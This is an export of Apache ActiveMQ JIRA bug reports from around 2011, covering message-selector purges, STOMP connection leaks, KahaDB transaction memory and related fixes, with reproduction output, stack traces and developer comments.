;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Purge command does not accept message selectors,AMQ-3404,12514469,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,areese,areese,18/Jul/11 17:11,16/Dec/11 11:41,14/Jul/23 05:43,16/Dec/11 11:41,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"The admin purge command does not work with a message selector.
A patch is forth coming, there is some cleanup, and compliance to be vetted before I can attach the patch.

(1) Browse with no arguments:

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58531k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608108263

JMS_HEADER_FIELD:JMSTimestamp = 1310608108740

JMS_HEADER_FIELD:JMSTimestamp = 1310608109283

JMS_HEADER_FIELD:JMSTimestamp = 1310608109790

JMS_HEADER_FIELD:JMSTimestamp = 1310608110324

JMS_HEADER_FIELD:JMSTimestamp = 1310608110831

JMS_HEADER_FIELD:JMSTimestamp = 1310608111374

JMS_HEADER_FIELD:JMSTimestamp = 1310608111872

JMS_HEADER_FIELD:JMSTimestamp = 1310608112415

JMS_HEADER_FIELD:JMSTimestamp = 1310608113005



(2) Browse with msgsel

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel 'JMSTimestamp<1310608110324' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58535k  max=902976k
     JVM args: -Dactivemq.classpath=""""
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608108263

JMS_HEADER_FIELD:JMSTimestamp = 1310608108740

JMS_HEADER_FIELD:JMSTimestamp = 1310608109283

JMS_HEADER_FIELD:JMSTimestamp = 1310608109790

(3) Purge with msgsel: - Not Working -  (what I wanted here was to use only those
matching my criteria)

user@activemq-master:~/activemq$ activemq-admin purge --msgsel 'JMSTimestamp<1310608110324' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58531k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

Connecting to JMX URL:
service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:1
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:2
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:3
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:4
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:5
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:6
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:7
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:8
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:9
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:32:1:1:10
from queue: queue.FOO.BAR


(4) Purge with msgsel working with a patch:

user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel 'JMSTimestamp<1310608391914' queue.FOO.BAR

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58535k  max=902976k
     JVM args: -Dactivemq.classpath="""" 
     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

JMS_HEADER_FIELD:JMSTimestamp = 1310608389116

JMS_HEADER_FIELD:JMSTimestamp = 1310608389607

JMS_HEADER_FIELD:JMSTimestamp = 1310608390266

JMS_HEADER_FIELD:JMSTimestamp = 1310608390781

JMS_HEADER_FIELD:JMSTimestamp = 1310608391390



user@activemq-master:~/activemq$ ./activemq-admin purge  --msgsel 'JMSTimestamp<1310608391914'  queue.FOO.BAR 

Java Runtime: Sun Microsystems Inc. 1.6.0_22
/home/y/libexec/jdk1.6.0/jre
   Heap sizes: current=60800k  free=58575k  max=902976k
     JVM args: -Dactivemq.classpath="""" 

     -Djavax.net.ssl.trustStoreType=JKS

ACTIVEMQ_HOME: /home/y/libexec/activemq
ACTIVEMQ_BASE: /home/y/libexec/activemq

Connecting to JMX URL:
service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO: Addobjects is :[JMSTimestamp<1310608391914]
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:1
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:2
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:3
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:4
from queue: queue.FOO.BAR
INFO: Removing message:
ID:activemq-master-55970-1309958858075-2:33:1:1:5
from queue: queue.FOO.BAR

",,areese,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Dec/11 15:51;tmielke;AMQ-3404.patch;https://issues.apache.org/jira/secure/attachment/12507370/AMQ-3404.patch","20/Jul/11 23:27;areese;PurgeCommand.patch;https://issues.apache.org/jira/secure/attachment/12487233/PurgeCommand.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60053,,,Fri Dec 16 11:41:22 UTC 2011,,,,,,,Patch Available,,,,"0|i0aj6v:",59382,,,,,,,,,,,,,,,,,,,,,"20/Jul/11 15:20;areese;The correct fix is to use a QueryViewMbean:

//                        List messages = JmxMBeansUtil.createMessageQueryFilter(createJmxConnection(), queueName).query(queryAddObjects);
//                        purgeMessages(queueName, messages);
						QueueViewMBean proxy = (QueueViewMBean) MBeanServerInvocationHandler
								.newProxyInstance(createJmxConnection(),
										queueName, QueueViewMBean.class, true);
						int removed = 0;
						for (String remove : queryAddObjects) {
							removed = proxy.removeMatchingMessages(remove);
							context.printInfo(""Removed: "" + removed
									+ "" messages for msgsel"" + remove);
						}
                    }
A patch and test is forthcoming, but -xmsgsel will not work with this patch;;;","20/Jul/11 23:27;areese;Patch to fix this issue, with a test cases that fails before and passes afterwards.

License on test code comes from copying other test code, specifically org.apache.activemq.network.jms.QueueBridgeTest;;;","21/Jul/11 10:08;dejanb;Patch applied with svn revision 1149095. Thanks!;;;","26/Jul/11 18:41;areese;This works for me, and is complete.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;","14/Dec/11 15:50;tmielke;I need to reopen this bug.

The proposed fix has a problem. When multiple message selector criteria are specified using a comma separated list, as in 
{code}
--msgsel ""JMSMessageID='*:10',JMSPriority>5""
{code}

then the current fix maps the criteria using an OR logical operator as this code shows:

{code:title=PurgeCommand.java}
protected void runTask(List<String> tokens) throws Exception {
  ...
  for (String remove : queryAddObjects) {
	removed = proxy.removeMatchingMessages(remove);
	context.printInfo(""Removed: "" + removed
		+ "" messages for msgsel"" + remove);
  }
  ...
}
{code}
This code iterates through each message selector criteria and removes the messages that matches each criteria individually.

Instead comma separated selector criteria should be treated as an AND operator. The usage output for activem-admin purge -help and activemq-admin browse -help suggests this and its also the way how activemq-admin browse behaves. 


Proposing a new fix including an updated TestPurgeCommand.java test.

This fix works with the ActiveMQ specific message selector syntax, e.g. 
{code}
   --msgsel ""JMSMessageID='*:10',JMSPriority>5""
{code}
but also with an SQL92 syntax specified on command line, e.g. 
{code} 
   --msgsel ""(JMSMessageID='*:10') AND (JMSPriority>5)""
{code};;;","14/Dec/11 15:51;tmielke;Attaching a possible fix in AMQ-3404.patch and would like to get some confirmation that this solution is good before I commit this fix.

Any feedback appreciated.
;;;","15/Dec/11 12:01;dejanb;This patch looks OK to me;;;","15/Dec/11 16:17;areese;Looks good to me.  I missed the sql92, and the , operator when I first did this.;;;","16/Dec/11 11:41;tmielke;Fixed in revision 1215056.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maven performance test plugin documenation is out-dated,AMQ-3403,12514456,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cathodion,cathodion,18/Jul/11 15:02,22/Jul/11 13:35,14/Jul/23 05:43,22/Jul/11 13:35,5.5.0,,,,,,,,Performance Test,,,,0,documentation,maven,outdated,performance,test,,,,"The documentation page for the maven activemq performance test is outdated. It states for instance that there is currently no released version while maven central repo contains version 5.5.0 and 5.6-SNAPSHOT (ok, that second one is no release, but still...)
Another thing is that the pom found in ""activemq-perftest directory from the sandbox repo"" does not deliver on the promises stated in the documentation :) The parent in the mentioned pom is 5.2-SNAPSHOT.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,67184,,,Fri Jul 22 13:35:42 UTC 2011,,,,,,,,,,,"0|i0ebwv:",81692,,,,,,,,,,,,,,,,,,,,,"18/Jul/11 22:17;tabish;If you attach some diffs for the changes you think need to be made we can apply then to the doco page.;;;","22/Jul/11 13:35;tabish;I made a few edits, if you have additional suggestions for updates please include them and reopen the issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ cannot determine between Queue and Topic for Weblogic destination,AMQ-3401,12514216,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,pwanner,pwanner,15/Jul/11 13:21,02/May/13 02:29,14/Jul/23 05:43,26/Aug/11 12:00,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"A JNDI lookup to Weblogic return a weblogic.jms.common.DestinationImpl instance that is the Weblogic generic implementation for Queue and Topic.

In the org.apache.activemq.command.ActiveMQDestination class the transform() method can obtain both a queue name and a topic name and therefore doesn't know in witch one to cast.

The Weblogic DestinationImpl has two methods isQueue() and isTopic() for that.

Here is a link to the thread about this issue: http://camel.465427.n5.nabble.com/Problem-with-ActiveMQ-to-Weblogic-route-td4578300.html

",,pwanner,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3496,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14541,,,Fri Aug 26 12:00:41 UTC 2011,,,,,,,,,,,"0|i0aj73:",59383,,,,,,,,,,,,,,,,,,,,,"26/Aug/11 12:00;dejanb;Pluggable unresolved destination transformer implemented with svn revision 1162073. A default implementation handles Weblogic scenario.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ feature.xml will not validate,AMQ-3398,12513723,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,mgardiner,mgardiner,11/Jul/11 21:49,02/Nov/13 22:05,14/Jul/23 05:43,02/Nov/13 22:05,5.5.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"I have started using the features-maven-plugin version 2.2.2 to validate my feature.xml file.  When I add the activemq-karaf repository to my features.xml file it errors with 

EXAMPLE: 
<features>
  <repository>mvn:org.apache.activemq/activemq-karaf/5.5.0/xml/features</repository>

ERROR: 
Unable to resolve artifact for uri mvn:org.apache.activemq/activemq-web-console/5.5.0/war?Webapp-Context=activemq-web-console 

I think this has something to do with the WAR feature needing to be installed but looking at http://svn.apache.org/viewvc/activemq/tags/activemq-5.5.0/activemq-karaf/src/main/resources/features.xml?view=markup it looks like it is already specified. 

I think the problem is that the url is missing the war: prefix as specified below. 


    <feature name=""activemq-web-console"" version=""5.5.0"" resolver=""(obr)"">
      <feature version=""[2,3)"">war</feature>
      <bundle>war:mvn:org.apache.activemq/activemq-web-console/5.5.0/war?Webapp-Context=activemq-web-console</bundle>
    </feature>

Thanks. 

-Mike-","Karaf 2.2.2, features-maven-plugin 2.2.2, JDK 6",davsclaus,mgardiner,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,68350,,,Sat Nov 02 22:05:21 UTC 2013,,,,,,,,,,,"0|i0eakv:",81476,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 22:05;davsclaus;Works with 5.9;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Number of established STOMP connections constantly increasing,AMQ-3393,12512860,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/Jul/11 14:31,20/Sep/11 10:42,14/Jul/23 05:43,05/Jul/11 15:25,5.5.0,,,,,5.6.0,,,Transport,,,,0,jmx,memory,memory_leak,stomp,,,,,"Rapid connect/disconnect can result in dangling stomp transport connection mbeans which eventually accumulate.
Issue occurs when a disconnect occurs before a broker connection has been fully initiated. The delayed stop, pending start completion was bypassed by a shutdown command from the stomp protocol convertor.

One potential symptom, when a client side port wrapps around and is reused for the MBean name. There is a registration failure, with {code}2011-06-15 12:27:22,860 [eMQ Task-125034] WARN  ManagedTransportConnection     - Failed to register MBean: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_52170
2011-06-15 12:27:22,860 [eMQ Task-125034] DEBUG ManagedTransportConnection     - Failure reason: javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_52170
javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=xx,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/xx_52170
	at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482)
	at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:299)
	at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:65)
	at org.apache.activemq.broker.jmx.ManagedTransportConnection.registerMBean(ManagedTransportConnection.java:99)
	at org.apache.activemq.broker.jmx.ManagedTransportConnection.<init>(ManagedTransportConnection.java:57)
	at org.apache.activemq.broker.jmx.ManagedTransportConnector.createConnection(ManagedTransportConnector.java:52)
	at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:216)
	at java.lang.Thread.run(Thread){code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14602,,,Tue Jul 05 15:25:55 UTC 2011,,,,,,,,,,,"0|i0aj7r:",59386,,,,,,,,,,,,,,,,,,,,,"05/Jul/11 15:25;gtully;issue resolved in http://svn.apache.org/viewvc?rev=1143080&view=rev

stomp disconnect was bypassing delayed shutdown so in the event that a disconnect occurs before a connect is fully formed, the connection was only partially disposed resulting in dangling mbean references.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
staticallyIncludedDestinations should always be forwarded ,AMQ-3382,12512228,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,29/Jun/11 14:56,20/Sep/11 10:41,14/Jul/23 05:43,29/Jun/11 14:58,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Even if the ""parent"" destination has been excluded",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14592,,,Wed Jun 29 14:58:48 UTC 2011,,,,,,,,,,,"0|i0aj8n:",59390,,,,,,,,,,,,,,,,,,,,,"29/Jun/11 14:58;dejanb;Fixed with svn revision 1141124;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connections web console page shows two rows per connection (one empty),AMQ-3381,12512192,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,dejanb,dejanb,29/Jun/11 10:09,20/Sep/11 10:41,14/Jul/23 05:43,29/Jun/11 10:12,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,,,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14596,,,Wed Jun 29 10:12:46 UTC 2011,,,,,,,,,,,"0|i0aj8v:",59391,,,,,,,,,,,,,,,,,,,,,"29/Jun/11 10:12;dejanb;Fixed with svn revision 1141034;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exclusive consumers do not rollback session when switched after master slave failover,AMQ-3380,12512008,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,mserrano,mserrano,28/Jun/11 15:31,20/Sep/11 10:42,14/Jul/23 05:43,06/Jul/11 13:55,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"This is a pure master/slave setup with multiple transacted exclusive consumers.  When the master is stopped, the exclusive consumer is switched (which seems odd to me).  This would be okay except the prior consumer is not rolled back.  The new consumer does not see all the messages (presumably since the prior consumer was not rolled back).  In rare cases in my environment, I have experienced message loss -- a message does not get sent on the new consumer.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/11 15:33;mserrano;master-slave-exclusive-consumer-test.patch;https://issues.apache.org/jira/secure/attachment/12484465/master-slave-exclusive-consumer-test.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60097,,,Wed Jul 06 13:55:59 UTC 2011,,,,,,,,,,,"0|i0aj93:",59392,,,,,,,,,,,,,,,,,,,,,"28/Jun/11 15:33;mserrano;Patch which adds a unit test that demonstrates this behavior.  The test sends 100 messages.  After 25 messages are sent, the master is stopped.  The new consumer gets 75 messages.;;;","06/Jul/11 13:55;tabish;When tested against trunk the test passes.  Fixes between 5.4.2 and trunk seem to have resolved the issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
stomp consumer might not receive all msgs of a virtual topic queue with memory limits,AMQ-3375,12511337,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,tmielke,tmielke,23/Jun/11 10:07,20/Sep/11 10:41,14/Jul/23 05:43,03/Aug/11 12:23,5.5.0,,,,,5.6.0,,,Broker,,,,0,stomp,virtualTopic,,,,,,,"Have a testcase that connects a Java stomp consumer to a virtual destination queue and consumes a fixed amount of msgs.
During the test I noticed that the consumer does not always receive the full amount of msgs.
Instead the receive times out although JMX QueueSize property is greater than 0. However when trying to browse the queue using JMX, it returns null, despite the fact that not all msgs got dequeued yet (dispatch and dequeue counter < enqueue counter).

So far I reproduced this with a stomp producer/consumer only. The producer writes msgs to a virtual topic VirtualTopic.Foo and the consumer takes msgs off the Consumer.A.VirtualTopic.Foo queue. Using JMX I noticed all msgs got moved from the virtual topic to the queue (reflected by JMX enqueue counter) but not all msgs got consumed.

So it seems the broker lost some msgs on the way. ","stomp consumer on virtual destination 
Tested on Ubuntu 10.10 and MacOSX using java 6.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3434,"23/Jun/11 10:08;tmielke;stomp-testcase.tgz;https://issues.apache.org/jira/secure/attachment/12483574/stomp-testcase.tgz",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14545,,,Wed Aug 03 12:23:14 UTC 2011,,,,,,,,,,,"0|i0aj9r:",59395,,,,,,,,,,,,,,,,,,,,,"23/Jun/11 10:08;tmielke;Attaching a test case in JUnit format. It may take a number of test runs before this test case fails (10 < x < 20).
For a description of the test case, have a read over the class documentation in src/test/resources/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java.

The test case uses an embedded broker but I have the feeling the problem is easier reproduced using an external broker with the config src/test/resources/StompVirtualTopicTest.xml. It also makes it easier to attach jconsole.

To run the test case simply call mvn test.;;;","28/Jun/11 22:38;tabish;I can get the test to fail using the provided unit test however the problem appears to be that the socket of the StompConnection is closed before the broker has had a chance to read all the messages from the socket buffer, if you add a sleep (6 seconds on my machine) before calling close the the test passes every time.;;;","29/Jun/11 18:29;tabish;A reliable way to make this test case always pass is to add the receipt request header to the final produced message and do a receive to await the response, this will ensure that all messages are read by the broker and placed on the queue.;;;","03/Aug/11 12:22;gtully;The test works once contention issues with plist creation that underpin the file pending message cursor were sorted in AMQ-3434;;;","03/Aug/11 12:23;gtully;fixed by AMQ-3434 - test case committed in rev: http://svn.apache.org/viewvc?rev=1153463&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Long KahaDB transactions could lead to OutOfMemory,AMQ-3374,12511208,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,22/Jun/11 07:59,27/Dec/11 12:31,14/Jul/23 05:43,22/Jun/11 12:58,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Problem: all writes are kept in memory until the sync time, which for long transactions could be a problem.

Solution: define max transaction size and if threshold is reached keep the rest of the writes in a temp file",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14557,,,Tue Dec 27 12:31:32 UTC 2011,,,,,,,,,,,"0|i0aj9z:",59396,,,,,,,,,,,,,,,,,,,,,"22/Jun/11 12:58;dejanb;This should now be fixed with svn revision 1138443

Default size of the transaction that will be kept in the memory is 10MB. This can be tuned with {{maxKahaDBTxSize}} system property (in bytes);;;","27/Dec/11 12:31;dejanb;Additional fix in svn revision 1224890

Transaction size is actual number of pages we keep in memory.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
vmQueueCursor or fileQueueCursor with expired messages in the store can lead to startup hang with kahaDB,AMQ-3357,12509175,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,03/Jun/11 12:23,02/May/13 02:29,14/Jul/23 05:43,03/Jun/11 12:25,5.4.2,5.5.0,,,,5.6.0,,,Message Store,,,,0,expiry,fileQueueCursor,hang,kahadb,restart,vmQueueCursor,,,"expiry during recovery, which is a read operation, can lead to the need to modify the store. The recovery processing should take out a readwrite lock on the store.

Issue arises for vm or file cursors as they replay messages from the store on restart to fill their caches. 
